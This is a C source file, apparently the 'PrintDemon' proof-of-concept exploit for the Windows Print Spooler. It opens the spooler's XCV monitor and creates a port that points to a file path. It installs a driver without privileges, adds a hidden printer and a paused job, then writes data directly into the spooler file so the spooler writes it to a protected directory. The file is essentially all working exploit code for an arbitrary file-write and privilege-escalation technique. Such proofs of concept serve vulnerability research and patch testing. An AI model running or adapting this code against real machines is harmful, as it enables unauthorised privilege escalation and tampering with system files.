#include <windows.h>
#include <stdio.h>

LPWSTR g_DriverName = L"Generic / Text Only";
LPWSTR g_PortName = L"c:\\windows\\tracing\\demoport.txt";
LPWSTR g_PrinterName = L"PrintDemon";

INT
main (
    _In_ INT ArgumentCount,
    _In_ PCHAR Arguments[]
    )
{
    HRESULT hr;
    PRINTER_INFO_2 printerInfo;
    HANDLE hPrinter;
    HANDLE hMonitor;
    BOOL bRes;
    DWORD dwNeeded, dwStatus;
    PRINTER_DEFAULTS printerDefaults;
    DWORD dwExists;
    struct
    {
        ADDJOB_INFO_1 jobInfo;
        WCHAR pathString[MAX_PATH];
    } job;
    BOOL bPrintWithSpooler;
    DWORD dwJobId;
    PCHAR printerData = "Hello! This is data from your printer :-)";
    DOC_INFO_1 docInfo;
    HANDLE hSpool;

    //
    // Initialize variables
    //
    UNREFERENCED_PARAMETER(Arguments);
    ZeroMemory(&job, sizeof(job));
    bPrintWithSpooler = TRUE;
    hPrinter = NULL;
    hMonitor = NULL;
    if (ArgumentCount > 1)
    {
        bPrintWithSpooler = FALSE;
    }

    //
    // Open a handle to the XCV port of the local spooler
    //
    printerDefaults.pDatatype = NULL;
    printerDefaults.pDevMode = NULL;
    printerDefaults.DesiredAccess = SERVER_ACCESS_ADMINISTER;
    bRes = OpenPrinter(L",XcvMonitor Local Port", &hMonitor, &printerDefaults);
    if (bRes == FALSE)
    {
        printf("Error opening XCV handle: %lx\n", GetLastError());
        goto CleanupPath;
    }

    //
    // Check if the target port name already exists 
    //
    dwNeeded = ((DWORD)wcslen(g_PortName) + 1) * sizeof(WCHAR);
    dwExists = 0;
    bRes = XcvData(hMonitor,
                    L"PortExists",
                    (LPBYTE)g_PortName,
                    dwNeeded,
                    (LPBYTE)&dwExists,
                    sizeof(dwExists),
                    &dwNeeded,
                    &dwStatus);
    if (dwExists == 0)
    {
        //
        // It doesn't, so create it!
        //
        dwNeeded = ((DWORD)wcslen(g_PortName) + 1) * sizeof(WCHAR);
        bRes = XcvData(hMonitor,
                        L"AddPort",
                        (LPBYTE)g_PortName,
                        dwNeeded,
                        NULL,
                        0,
                        &dwNeeded,
                        &dwStatus);
        if (bRes == FALSE)
        {
            printf("Failed to add port: %lx\n", dwStatus);
            goto CleanupPath;
        }
    }

    //
    // Check if the printer already exists
    //
    printerDefaults.pDatatype = NULL;
    printerDefaults.pDevMode = NULL;
    printerDefaults.DesiredAccess = PRINTER_ALL_ACCESS;
    bRes = OpenPrinter(g_PrinterName, &hPrinter, &printerDefaults);
    if ((bRes == FALSE) && (GetLastError() == ERROR_INVALID_PRINTER_NAME))
    {
        //
        // First, install the generic text only driver. Because this is already
        // installed, no privileges are required to do so.
        //
        hr = InstallPrinterDriverFromPackage(NULL, NULL, g_DriverName, NULL, 0);
        if (FAILED(hr))
        {
            printf("Failed to install print driver: %lx\n", hr);
            goto CleanupPath;
        }

        //
        // Now create a printer to attach to this port
        // This data must be valid and match what we created earlier
        //
        ZeroMemory(&printerInfo, sizeof(printerInfo));
        printerInfo.pPortName = g_PortName;
        printerInfo.pDriverName = g_DriverName;
        printerInfo.pPrinterName = g_PrinterName;

        //
        // This data must always be as indicated here
        //
        printerInfo.pPrintProcessor = L"WinPrint";
        printerInfo.pDatatype = L"RAW";

        //
        // This part is for fun/to find our printer easily
        //
        printerInfo.pComment = L"I'd be careful with this one...";
        printerInfo.pLocation = L"Inside of an exploit";
        printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
        printerInfo.AveragePPM = 9001;
        hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
        if (hPrinter == NULL)
        {
            printf("Failed to create printer: %lx\n", GetLastError());
            goto CleanupPath;
        }
    }

    //
    // Purge the printer of any previous jobs
    //
    bRes = SetPrinter(hPrinter, 0, NULL, PRINTER_CONTROL_PURGE);
    if (bRes == FALSE)
    {
        printf("Failed to purge jobs: %lx\n", GetLastError());
        goto CleanupPath;
    }

    //
    // Are we printing with GDI, or with the spooler?
    //
    if (bPrintWithSpooler == TRUE)
    {
        //
        // Manually add a new job
        //
        bRes = AddJob(hPrinter, 1, (LPBYTE)&job, sizeof(job), &dwNeeded);
        if (bRes == FALSE)
        {
            printf("Failed to add job: %lx\n", GetLastError());
            goto CleanupPath;
        }

        //
        // Save the Job ID
        //
        dwJobId = job.jobInfo.JobId;
    }
    else
    {
        //
        // Use the GDI API to start a new print job
        //
        docInfo.pDatatype = L"RAW";
        docInfo.pOutputFile = NULL;
        docInfo.pDocName = L"Ignore Me";
        dwJobId = StartDocPrinter(hPrinter, 1, (LPBYTE)&docInfo);
    }

    //
    // Pause it, so it never actually prints
    //
    printf("[+] Created Job ID: %d\n", dwJobId);
    bRes = SetJob(hPrinter, dwJobId, 0, NULL, JOB_CONTROL_PAUSE);
    if (bRes == FALSE)
    {
        printf("[-] Failed to pause job: %lx\n", GetLastError());
        goto CleanupPath;
    }

    //
    // Check if we're manually printing or using the GDI API
    //
    if (bPrintWithSpooler == TRUE)
    {
        //
        // Open the spooler file
        //
        printf("[.] Opening spooler job: %S\n", job.jobInfo.Path);
        hSpool = CreateFile(job.jobInfo.Path,
                            GENERIC_WRITE,
                            0,
                            NULL,
                            CREATE_NEW,
                            0,
                            NULL);
        if (hSpool == INVALID_HANDLE_VALUE)
        {
            printf("[-] Failed to open spooler file: %lx\n", GetLastError());
            goto CleanupPath;
        }

        //
        // Write the data
        //
        bRes = WriteFile(hSpool,
                         printerData,
                         (DWORD)strlen(printerData),
                         &dwNeeded,
                         NULL);
        if (bRes == FALSE)
        {
            printf("[-] Failed to write the spooler data: %lx\n", GetLastError());
            CloseHandle(hSpool);
            goto CleanupPath;
        }

        //
        // Done with the spooler file and schedule it
        //
        CloseHandle(hSpool);
        ScheduleJob(hPrinter, dwJobId);
    }
    else
    {
        //
        // Write the data
        //
        bRes = WritePrinter(hPrinter,
                            printerData,
                            (DWORD)strlen(printerData),
                            &dwNeeded);
        if (bRes == FALSE)
        {
            printf("[-] Failed to write the spooler data: %lx\n", GetLastError());
            goto CleanupPath;
        }

        //
        // Schedule the job for spooling
        //
        EndDocPrinter(hPrinter);
    }

    //
    // Wait for the client to read it
    //
    printf("[+] Launch client... and press ENTER after\n");
    getchar();

CleanupPath:
    //
    // Now delete the printer and close the handle
    //
    if (hPrinter != NULL)
    {
        bRes = DeletePrinter(hPrinter);
        if (bRes == FALSE)
        {
            //
            // Non fatal, this is the cleanup path
            //
            printf("[-] Failed to delete printer: %lx\n", GetLastError());
        }
        printf("[+] Printer deleted\n");
        ClosePrinter(hPrinter);
    }

    //
    // Cleanup our port
    //
    if (hMonitor != NULL)
    {
        dwNeeded = ((DWORD)wcslen(g_PortName) + 1) * sizeof(WCHAR);
        bRes = XcvData(hMonitor,
                       L"DeletePort",
                       (LPBYTE)g_PortName,
                       dwNeeded,
                       NULL,
                       0,
                       &dwNeeded,
                       &dwStatus);
        if (bRes == FALSE)
        {
            //
            // Non fatal, this is the cleanup path
            //
            printf("[-] Failed to delete port: %lx\n", GetLastError());
        }

        //
        // Close the monitor port
        //
        printf("[+] Port deleted\n");
        ClosePrinter(hMonitor);
    }
    return 0;
}
